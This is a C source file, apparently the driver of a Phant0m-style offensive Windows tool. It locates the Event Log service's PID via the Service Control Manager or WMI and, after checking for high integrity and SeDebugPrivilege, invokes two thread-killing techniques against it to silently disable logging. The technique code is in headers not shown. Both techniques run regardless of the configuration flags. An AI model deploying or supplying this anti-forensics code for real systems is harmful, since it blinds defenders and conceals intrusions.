#include <windows.h>
#include <stdio.h>

#include "process_info.h"

// PID detection techniques configuration section.
#define PID_FROM_SCM 1 // If you set it to 1, the PID of the Event Log service is obtained from the Service Manager.
#define PID_FROM_WMI 0 // If you set it to 1, the PID of the Event Log service is obtained from the WMI.


// TID detection and kill techniques configuration section. 
#define KILL_WITH_T1 1 // If you set it to 1, Technique-1 will be use. For more information; https://github.com/hlldz/Phant0m
#define KILL_WITH_T2 0 // If you set it to 1, Technique-2 will be use. For more information; https://github.com/hlldz/Phant0m



#include "pid_SCM.h"



#include "pid_WMI.h"



//#if defined(KILL_WITH_T1) && KILL_WITH_T1 == 1
#include "technique_1.h"
//#endif

//#if defined(KILL_WITH_T2) && KILL_WITH_T2 == 1
#include "technique_2.h"
//#endif

void InvokeEventLogSpecial() {


	if (enoughIntegrityLevel() == TRUE) {

		printf("[+] Process Integrity Level is high, continuing...\n\n");

		if (isPrivilegeOK() == TRUE) {

#if defined(PID_FROM_SCM) && PID_FROM_SCM == 1
			DWORD dwEventLogPID = GetPIDFromSCManager();
#endif

#if defined(PID_FROM_WMI) && PID_FROM_WMI == 1
			DWORD dwEventLogPID = GetPIDFromWMI();
#endif

			if (dwEventLogPID != 0) {

				printf("[+] Event Log service PID detected as %d.\n\n", dwEventLogPID);


				BOOL res = Technique_1(dwEventLogPID);
				printf("[+] Technique_1 %d.\n", res);
				res = Technique_2(dwEventLogPID);
				printf("[+] Technique_2 %d.\n", res);


			}
			else {

				printf("[!] Exiting...\n");

			}
		}
		else {

			printf("[!] SeDebugPrivilege cannot enabled. Exiting...\n");

		}

	}
	else {

		printf("[!] Process Integrity Level is not high. Exiting...\n");

	}

	printf("\n[*] All done.\n");

}

